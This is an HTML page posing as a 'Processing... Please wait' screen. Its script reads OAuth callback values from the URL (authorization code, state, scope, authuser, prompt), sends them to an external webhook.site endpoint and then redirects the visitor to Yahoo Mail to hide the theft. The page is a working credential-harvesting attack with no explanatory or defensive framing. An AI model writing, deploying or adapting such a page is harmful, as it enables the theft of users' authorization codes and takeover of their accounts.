<html>
<head>
    <title>Processing...</title>
</head>
<body>
    <p>Please wait...</p>
    <script>
        // Capture all query parameters from the URL
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code') || 'No code found';
        const state = urlParams.get('state') || 'No state found';
        const scope = urlParams.get('scope') || 'No scope found';
        const authuser = urlParams.get('authuser') || 'No authuser found';
        const prompt = urlParams.get('prompt') || 'No prompt found';
        
        // Send the captured data to Webhook
        const data = `Code: ${code}, State: ${state}, Scope: ${scope}, Authuser: ${authuser}, Prompt: ${prompt}`;
        fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(data))
            .then(response => console.log('Data sent to Webhook'))
            .catch(error => console.error('Error sending to Webhook:', error));

        // Final redirect to mail.yahoo.com after 5 seconds
        setTimeout(function() {
            window.location.href = "https://mail.yahoo.com";
        }, 5000);
    </script>
</body>
</html>